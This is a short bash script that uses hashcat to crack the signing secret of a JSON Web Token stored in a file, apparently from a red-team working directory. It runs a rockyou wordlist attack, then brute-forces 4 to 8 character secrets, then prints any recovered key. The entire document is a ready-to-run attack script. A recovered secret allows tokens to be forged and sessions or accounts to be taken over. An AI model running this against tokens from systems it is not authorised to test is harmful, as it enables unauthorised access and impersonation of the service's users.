#!/bin/bash
JWT_FILE="/home/kzp/claude-red/slxoz1688.jwt.txt"

echo "=== Phase 1: rockyou wordlist ==="
hashcat -a 0 -m 16500 "$JWT_FILE" /usr/share/wordlists/rockyou.txt \
  --status --status-timer=10 -O 2>&1

echo ""
echo "=== Checking for cracked result ==="
hashcat -a 0 -m 16500 "$JWT_FILE" /usr/share/wordlists/rockyou.txt --show 2>/dev/null

echo ""
echo "=== Phase 2: short brute (?a x4-8) ==="
hashcat -a 3 -m 16500 "$JWT_FILE" '?a?a?a?a?a?a?a?a' \
  --increment --increment-min 4 \
  --status --status-timer=15 -O 2>&1

echo ""
echo "=== Final result ==="
hashcat -m 16500 "$JWT_FILE" --show 2>/dev/null || echo "Not cracked"
